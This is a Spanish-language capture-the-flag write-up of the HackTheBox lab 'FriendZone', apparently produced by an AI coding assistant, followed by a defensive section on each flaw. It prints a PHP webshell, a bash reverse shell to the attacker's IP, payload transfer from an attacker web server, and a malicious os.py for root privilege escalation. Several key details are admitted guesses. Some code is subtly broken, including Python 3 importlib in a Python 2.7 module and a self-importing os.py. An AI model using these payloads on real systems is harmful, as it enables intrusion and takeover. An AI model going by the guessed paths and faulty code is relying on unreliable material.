---
title: FriendZone (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, linux, smb, dns, lfi, rce, python-library-hijacking, cron-privesc, php]
type: nota
status: en-progreso
source: claude-code
aliases: [FriendZone HTB, htb-friendzone, friendzone-writeup]
---

# FriendZone — HackTheBox (Easy)

SO: Linux · Dificultad: Easy · Skills: enumeración SMB+DNS, LFI + upload via SMB → RCE, Python library hijacking via cron

FriendZone encadena tres técnicas distintas que raramente se ven juntas en una misma máquina Easy: transferencia de zona DNS para descubrir vhosts, una LFI explotada combinando un share SMB escribible, y una escalada de privilegios por secuestro de librería Python. Es una máquina muy pedagógica para entender cómo servicios aparentemente independientes (SMB, DNS, HTTP) se encadenan en un único vector de ataque.

> HTB es un laboratorio de ciberseguridad legal y autorizado; practicar en él es 100 % ético siempre que uses tus propias máquinas asignadas.

---

## Objetivo

Obtener ejecución de código en el servidor web (como `www-data`), pivotar al usuario `friend` usando credenciales encontradas en el sistema de archivos, y escalar a `root` mediante Python library hijacking ejecutado por un cron job de root. Recuperar `user.txt` y `root.txt`.

---

## Acceso a la máquina (paso previo)

1. Descarga tu perfil VPN desde HTB (`.ovpn`) y conéctate:
   ```bash
   sudo openvpn lab_<usuario>.ovpn
   ```
   Deja esa terminal abierta durante toda la sesión.

2. En la web de HTB, ve a la máquina **FriendZone** (sección *Retired Machines*) y haz clic en *Spawn Machine*. Se te asignará una IP dinámica del rango `10.10.10.x`.

   > Las máquinas retiradas requieren suscripción **VIP**. Las activas son gratuitas. Si usas el **Pwnbox** (Kali en el navegador), ya viene conectado a la VPN.

3. Verifica conectividad:
   ```bash
   ping -c2 <IP>
   ```

4. Sustituye `<IP>` por la dirección que te haya asignado HTB en todos los comandos siguientes. También tendrás que añadir los vhosts descubiertos a tu `/etc/hosts`.

---

## Reconocimiento

**Categoría: escaneo de puertos y detección de servicio.**

```bash
nmap -sC -sV -p- --min-rate 5000 -oN friendzone.nmap <IP>
```

Puertos relevantes:

```
21/tcp   open  ftp       vsftpd 3.0.3
22/tcp   open  ssh       OpenSSH 7.6p1
53/tcp   open  domain    ISC BIND 9.11.3-1ubuntu1.2
80/tcp   open  http      Apache httpd 2.4.29
139/tcp  open  netbios-ssn
443/tcp  open  https     Apache httpd 2.4.29
445/tcp  open  microsoft-ds
```

La superficie es amplia: **SMB** (139/445), **DNS** (53), **HTTP/HTTPS** (80/443), FTP y SSH. La combinación SMB + DNS en una máquina Linux es la pista clave: hay shares que explorar y probable transferencia de zona.

---

## Enumeración

La enumeración se divide en tres frentes simultáneos: SMB, DNS y web. El orden importa porque cada uno revela información para el siguiente.

### SMB — Listar shares

**Categoría: enumeración de recursos compartidos SMB.**

```bash
smbclient -L //<IP> -N
# o con smbmap para ver permisos de un vistazo:
smbmap -H <IP>
```

Resultado típico (los nombres exactos pueden verificarse contra la máquina en vivo):

```
Disk                  Permissions
----                  -----------
print$                NO ACCESS
Files                 NO ACCESS
general               READ ONLY
Development           READ, WRITE
IPC$                  NO ACCESS
```

El share `general` es legible y el share `Development` es **escribible**. Eso es oro para lo que viene.

Listamos el contenido de `general`:

```bash
smbclient //<IP>/general -N
smb: \> ls
smb: \> get creds.txt
```

El archivo `creds.txt` (o similar) contiene credenciales del panel de administración web. Anótalas; se usarán en el foothold.

### DNS — Transferencia de zona

**Categoría: DNS Zone Transfer (AXFR). Sin CVE asignado, es una mala configuración clásica.**

El servidor DNS en el puerto 53 está configurado de forma insegura: permite transferencias de zona sin autenticación. Esto revela todos los registros DNS del dominio, incluidos subdominios internos (vhosts).

```bash
dig axfr friendzone.red @<IP>
```

La respuesta lista los subdominios del dominio `friendzone.red`. Entre ellos aparece algo como:

```
administrator1.friendzone.red
hr.friendzone.red
uploads.friendzone.red
...
```

Añade todos los subdominios descubiertos a tu `/etc/hosts`:

```bash
sudo bash -c 'echo "<IP> administrator1.friendzone.red uploads.friendzone.red friendzone.red" >> /etc/hosts'
```

> Si la máquina usa un dominio distinto (p.ej. `friendzoneportal.red`), repite el comando `dig axfr` con ese dominio. Ajusta según lo que devuelva nmap en el certificado TLS o en los headers HTTP.

### Web — Panel de administración

Navega a `https://administrator1.friendzone.red`. Aparece un formulario de login. Usa las credenciales obtenidas del share SMB `general`.

Tras autenticarte llegas a un panel con una URL de la forma:

```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp
```

El parámetro `pagename` carga dinámicamente un archivo PHP: `timestamp.php`. Esto huele a LFI.

Prueba básica de LFI:

```http
GET /dashboard.php?image_id=a.jpg&pagename=../../../../etc/passwd HTTP/1.1
Host: administrator1.friendzone.red
```

Si devuelve el contenido de `/etc/passwd`, la inclusión de archivos locales está confirmada. La extensión `.php` se añade automáticamente al valor del parámetro, lo que limita los archivos incluibles (solo `.php`) pero es suficiente para RCE si podemos subir un archivo PHP.

---

## Acceso inicial (foothold)

**Categoría: LFI + File Upload via SMB → Remote Code Execution.**

La cadena es:

1. Subir un archivo PHP malicioso al share SMB escribible (`Development`).
2. Incluirlo vía LFI desde el panel web.

### Paso 1 — Subir una webshell al share SMB escribible

```bash
# Creamos una webshell PHP mínima
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# La subimos al share Development
smbclient //<IP>/Development -N
smb: \> put shell.php
smb: \> exit
```

### Paso 2 — Descubrir la ruta del share en el sistema de archivos

Para incluir el archivo vía LFI necesitamos saber dónde monta Apache el share. La ruta habitual en esta máquina es `/etc/Development/` o dentro de `/var/www/`. Puedes confirmarlo probando rutas comunes:

```
?pagename=../../../../etc/Development/shell&cmd=id
?pagename=../../../../var/www/html/Development/shell&cmd=id
```

La ruta correcta (verificar contra la máquina en vivo) típicamente es algo como:

```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell&cmd=id
```

Si devuelve `uid=33(www-data)`, tenemos RCE. Nótese que `dashboard.php` añade `.php` al valor de `pagename`, así que `shell` referencia a `shell.php`.

### Paso 3 — Obtener una reverse shell

Montamos un listener:

```bash
nc -lvnp 4444
```

Y lanzamos la reverse shell desde el parámetro `cmd` (URL-encodeada):

```bash
# El valor del parámetro cmd (antes de URL-encodear):
bash -c 'bash -i >& /dev/tcp/<TU_IP>/4444 0>&1'
```

Estabilizamos la shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Somos `www-data`.

### Paso 4 — Pivotar a `friend` con credenciales encontradas

Enumeramos archivos de configuración de la aplicación web:

```bash
find /var/www -name "*.conf" -o -name "*.php" 2>/dev/null | xargs grep -l "pass\|user\|db" 2>/dev/null
```

Se encuentra un archivo (habitualmente `mysql_data.conf` o similar dentro de `/var/www/`) que contiene credenciales en texto plano:

```
db_user=friend
db_pass=<password-en-texto-plano>
```

Probamos esas credenciales por SSH:

```bash
ssh friend@<IP>
```

Accedemos como `friend`. Leemos la flag de usuario:

```bash
cat ~/user.txt
# <flag>
```

---

## Escalada de privilegios

**Categoría: Python Library Hijacking vía cron job de root sobre módulo en ruta escribible.**

### Enumeración como `friend`

Ejecutamos `pspy` o examinamos manualmente procesos y cron jobs para ver qué ejecuta root periódicamente:

```bash
# Descargar pspy64 a /tmp y ejecutar:
# (desde tu máquina atacante)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
python3 -m http.server 8080

# Desde la máquina víctima:
wget http://<TU_IP>:8080/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

Se observa que root ejecuta periódicamente un script Python, algo como:

```
/usr/bin/python /opt/server_admin/reporter.py
```

Revisamos el script:

```bash
cat /opt/server_admin/reporter.py
```

El script contiene una línea similar a:

```python
import os
...
```

Importa el módulo estándar `os`. El ataque consiste en **plantar un `os.py` malicioso en una ruta que Python busca antes que la librería estándar**.

### Identificar la ruta de búsqueda de módulos

```bash
python -c "import sys; print(sys.path)"
```

Python busca módulos en orden. Si alguna de las rutas anteriores a `/usr/lib/python2.7/` es escribible por `friend`, podemos plantar nuestro `os.py` malicioso ahí.

Una ruta común que aparece antes en `sys.path` es el directorio de trabajo actual o alguna ruta de librería con permisos incorrectos. En FriendZone, el módulo `os` se resuelve desde una ruta donde `friend` tiene permisos de escritura (verificar con `ls -la` sobre cada ruta del `sys.path`).

La ruta típica vulnerable en esta máquina es `/usr/lib/python2.7/` o una carpeta de site-packages con permisos permisivos. El patrón exacto puede variar; lo importante es:

```bash
ls -la /usr/lib/python2.7/os.py
# si es escribible por friend o su grupo:
ls -la /usr/lib/python2.7/
```

### Plantar el módulo `os.py` malicioso

Una vez identificada la ruta escribible, creamos un `os.py` que da SUID a bash o lanza una reverse shell. La opción más limpia:

```python
# /usr/lib/python2.7/os.py (o la ruta escribible identificada)
import os
import pty
import socket

# Preservamos las funciones del módulo real para no romper el script
# importando desde la ruta absoluta de la librería estándar
import importlib.util
spec = importlib.util.spec_from_file_location("os_real", "/usr/lib/python2.7/os.pyc")
```

En la práctica, para un CTF la forma más directa es:

```bash
cat > /usr/lib/python2.7/os.py << 'EOF'
import socket
import subprocess
import os as _os

# Payload de escalada
_os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")

# Re-exportamos lo que el script original necesita del módulo os
# para que no falle con AttributeError
from posix import *
EOF
```

> Advertencia: sobreescribir `os.py` real puede romper otros procesos del sistema que usen Python. En un entorno real, esto sería disruptivo. En HTB solo afecta a tu máquina de laboratorio.

Esperamos a que el cron de root ejecute el script. Cuando `/tmp/rootbash` aparezca con SUID:

```bash
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root ... /tmp/rootbash

/tmp/rootbash -p
whoami
# root
```

```bash
cat /root/root.txt
# <flag>
```

---

## Flags

| Flag | Ubicación | Cómo llegar |
|------|-----------|-------------|
| `user.txt` | `/home/friend/user.txt` | SSH como `friend` tras encontrar credenciales en `mysql_data.conf` |
| `root.txt` | `/root/root.txt` | Shell de root tras Python library hijacking |

---

## Patron y teoria

Esta es la sección más importante. FriendZone encadena cuatro técnicas en secuencia; la defensa se diseña en cada eslabón.

### Cadena completa

```
SMB enum (share legible) → credenciales panel web
DNS Zone Transfer        → vhosts ocultos (administrator1.friendzone.red)
LFI en pagename= + SMB upload (share escribible) → RCE como www-data
Credenciales en archivo de configuración → SSH como friend
Cron root + Python library hijacking → root
```

### Eslabón 1 — DNS Zone Transfer (información)

**Categoría: [[03-seguridad-de-redes]] · Mala configuración de BIND/named.**

Una transferencia de zona AXFR sin autenticación expone toda la topología de nombres interna: subdominios de administración, entornos de staging, IPs internas. El atacante pasa de ver `friendzone.red` a ver `administrator1.friendzone.red` en segundos.

- **Defensa**: restringir las transferencias de zona en `/etc/named.conf` con `allow-transfer { <IP_esclavo_DNS>; };`. Solo los servidores DNS secundarios legítimos deben poder hacer AXFR.
- **Defensa adicional**: usar vistas DNS (`view`) para separar lo que se resuelve desde Internet vs. desde la red interna.
- **Detección**: alertar sobre queries AXFR desde IPs no autorizadas en los logs de BIND.

### Eslabón 2 — SMB mal configurado (shares con permisos excesivos)

**Categoría: [[03-seguridad-de-redes]] · Principio de mínimo privilegio en recursos compartidos.**

Un share legible por cualquier usuario anónimo que contiene credenciales (`creds.txt`) y un share escribible por cualquier usuario anónimo (`Development`) son dos errores de configuración independientes que combinados permiten el foothold completo.

- **Defensa**: los shares SMB nunca deben ser accesibles sin autenticación (`-N` en smbclient no debería funcionar). Usar `map to guest = never` en `smb.conf`.
- **Defensa de contenido**: nunca almacenar credenciales en texto plano en shares. Usar gestores de secretos (Vault, AWS Secrets Manager).
- **Permisos de shares**: el share `Development` debería ser solo escribible por el usuario de servicio específico, no por el grupo `everyone`.

### Eslabón 3 — LFI + File Upload → RCE

**Categoría: [[04-seguridad-web-owasp]] · CWE-22 (Path Traversal) + CWE-434 (Unrestricted File Upload).**

El parámetro `pagename` toma un valor controlado por el usuario y lo pasa directamente a `include()` en PHP. Combinado con la capacidad de subir archivos PHP al sistema (via SMB), esto da ejecución de código arbitrario.

- **Defensa de código (LFI)**: nunca construir una ruta de inclusión (`include`, `require`) directamente desde input del usuario. Usar una lista blanca de páginas permitidas:
  ```php
  $allowed = ['dashboard', 'profile', 'settings'];
  if (!in_array($_GET['pagename'], $allowed)) { die('Invalid page'); }
  include($_GET['pagename'] . '.php');
  ```
- **Defensa de diseño (upload)**: el servidor web nunca debe tener acceso de lectura a directorios donde usuarios externos pueden escribir archivos. Los directorios de upload deben estar fuera del document root, o configurar Apache/Nginx para que no ejecute PHP en esa carpeta (`php_flag engine off`).
- **Separación de privilegios**: el usuario de Apache (`www-data`) no debe tener acceso de lectura a shares SMB montados en el sistema.

### Eslabón 4 — Credenciales en texto plano en archivos de configuración

**Categoría: [[06-seguridad-de-sistemas-y-hardening]] · CWE-312 (Cleartext Storage of Sensitive Information).**

El archivo `mysql_data.conf` contiene usuario y contraseña de base de datos en texto plano, legibles por `www-data`. Esas credenciales resultan ser también las de SSH del usuario `friend`.

- **Defensa**: las credenciales de base de datos en archivos de configuración deben estar en archivos con permisos `640` o `600`, propiedad del usuario de aplicación (`www-data`) y no del grupo genérico. Mejor aún: usar variables de entorno o un gestor de secretos.
- **Defensa adicional**: nunca reutilizar contraseñas entre servicios distintos (base de datos ≠ SSH). Si `mysql_data.conf` cae, no debe dar acceso SSH.
- **Defensa para devs**: en el desarrollo de apps web, los archivos `.conf` con credenciales no deben estar dentro del document root (`/var/www/html/`). Guardarlos un nivel arriba, fuera del alcance de Apache.

### Eslabón 5 — Python Library Hijacking via cron

**Categoría: [[06-seguridad-de-sistemas-y-hardening]] · CWE-427 (Uncontrolled Search Path Element).**

Este es el patrón más sutil y menos conocido de los cinco. Cuando Python ejecuta `import os`, busca el módulo en `sys.path` en orden. Si alguna ruta anterior a la librería estándar es escribible por un usuario no privilegiado, ese usuario puede plantar un módulo falso que se ejecuta con los privilegios del proceso que lo importa (en este caso, root via cron).

El patrón general:

```
proceso con altos privilegios
  → ejecuta script Python
    → importa módulo X
      → Python busca X en sys.path
        → ruta escribible antes que la librería estándar
          → atacante planta módulo X malicioso ahí
            → ejecución con los privilegios del proceso padre
```

- **Defensa de permisos**: auditar los permisos de todas las rutas en `sys.path` para cualquier script Python ejecutado con privilegios elevados. Ninguna debe ser escribible por usuarios no privilegiados. Ejecutar: `python -c "import sys; print(sys.path)"` y revisar cada entrada con `ls -la`.
- **Defensa de entorno**: usar entornos virtuales (`venv`) con rutas absolutas conocidas para scripts de administración. El `sys.path` de un venv es predecible y aislado.
- **Defensa de cron**: los scripts Python ejecutados por cron de root deben usar la ruta absoluta del intérprete (`/usr/bin/python3`) y tener la variable `PYTHONPATH` limpia en el entorno del cron (`PYTHONPATH=` al inicio del crontab).
- **Defensa de diseño**: si un script de administración necesita ejecutarse como root, usar un servicio systemd con `PrivateTmp=true`, `ProtectSystem=strict`, y `ReadOnlyPaths=` sobre las librerías Python, en lugar de cron.

### Resumen para un dev/purple team

> FriendZone demuestra que la seguridad es una cadena: no hay un único "fallo grave", sino cinco errores de configuración mediocres que encadenados dan root. Un atacante solo necesita encontrar *uno* para entrar; desde ahí, cada eslabón siguiente es evitable. La defensa en profundidad (defense in depth) significa que aunque un eslabón falle, el siguiente debe detener o al menos ralentizar el avance. En esta máquina, ninguno lo hace.

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[HTB_Starting_Point/00_README]]
- [[03-seguridad-de-redes]]
- [[04-seguridad-web-owasp]]
- [[06-seguridad-de-sistemas-y-hardening]]
